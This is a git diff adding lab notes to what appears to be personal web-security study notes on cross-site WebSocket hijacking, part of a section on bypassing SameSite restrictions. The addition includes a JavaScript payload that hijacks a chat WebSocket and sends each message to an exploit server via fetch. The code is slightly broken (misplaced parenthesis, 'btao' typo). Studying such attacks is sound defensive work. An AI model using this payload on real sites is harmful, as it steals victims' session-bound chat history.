@@ -40,4 +40,20 @@ If the site is redirecting then find a script that is doing the redirect, study 
 #### Bypassing SameSite restrictions via vulnerable sibling domains
 
 In addition to classic `CSRF`, don't forget that if the target website supports `WebSockets`, this functionality might be vulnerable to cross-site WebSocket hijacking (CSWSH), which is essentially just a CSRF attack targeting a WebSocket handshake. 
+##### lab:
+in the lab we have a chat feature that uses websockets, when capturing the request on burp we see that we send a ready message and the websocket server responds with the entire chat history that is tied to our session cookie
+in http history find a response that mentions switching protocol in that corresponding request check if the request contains all the points for it to be CSRF vulnerable. 
+###### samesite: None
 
+```
+var webSocket = new WebSocket("lab-url/chat");
+
+webSocket.onopen = function(evt){
+	webSocket.send("READY");
+};
+
+webSocket.onmessage = function(evt){
+	var message = evt.data;
+	fetch("exploit-server-url/exploit?message=")+btao(message);
+};
+```
